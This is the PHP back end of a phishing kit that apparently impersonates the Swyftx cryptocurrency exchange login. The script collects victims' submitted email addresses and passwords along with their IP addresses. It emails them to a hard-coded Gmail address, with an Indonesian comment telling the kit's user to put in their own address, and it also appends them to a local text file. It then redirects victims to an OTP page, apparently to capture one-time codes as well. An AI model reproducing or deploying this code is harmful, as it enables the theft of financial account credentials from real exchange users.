<?php

$ip 	= getenv("REMOTE_ADDR");
$email   = $_POST['email'];
$password   = $_POST['password'];



$message = "

=============BISMILLAHAJADULU============

Bismillah	: $email
Amin		: $password
IP		: $ip

=============BISMILLAHAJADULU============ ";


$to = "ninakarusa@gmail.com"; // ganti email
$subject = "SWYTFX MASUK = [$ip]";
$headers = "From: SETORAN <setoran@trade.swyftxau.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);


header("Location:otpemail.html");


?>

<?php
$ip   = getenv("REMOTE_ADDR");
$file = "_________________1MILYARD__________________.txt";
$email   = $_POST['email'];
$password = $_POST['password'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "=============BISMILLAHAJADULU============");
fwrite($handle, "\n");
fwrite($handle, "Bismillah	: ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "Amin		: ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "=============BISMILLAHAJADULU============");
fwrite($handle, "\n");
fclose($handle);

?>
